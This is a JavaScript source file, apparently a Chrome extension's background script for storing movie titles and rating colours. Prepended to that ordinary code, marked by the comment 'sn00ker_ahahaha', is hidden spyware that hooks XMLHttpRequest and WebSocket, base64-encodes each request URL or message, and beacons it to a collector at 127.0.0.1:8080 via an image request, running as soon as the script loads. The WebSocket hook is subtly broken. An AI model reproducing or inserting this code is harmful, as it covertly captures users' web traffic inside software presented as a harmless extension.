function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
chrome.extension.onMessage.addListener(function(request, sender, sendResponse) {
  if (request.method == "getMovies") {
    sendResponse({userid:localStorage.userid,
      titles:localStorage.titles, movies:localStorage.movies,
      titleFg:getValue("titleFg", "000000"), titleBg:getValue("titleBg", "6BE06B"),
      ratingFg:getValue("ratingFg", "FFFFFF"), ratingBg:getValue("ratingBg", "C2163A")});
  } else if (request.method == "setMovies") {
    localStorage.userid = request.userid;
    localStorage.titles = request.titles;
    localStorage.movies = request.movies;
  }
});

function getValue(key, defaultValue) {
  var value = localStorage[key];
  return value == undefined ? defaultValue : value;
}
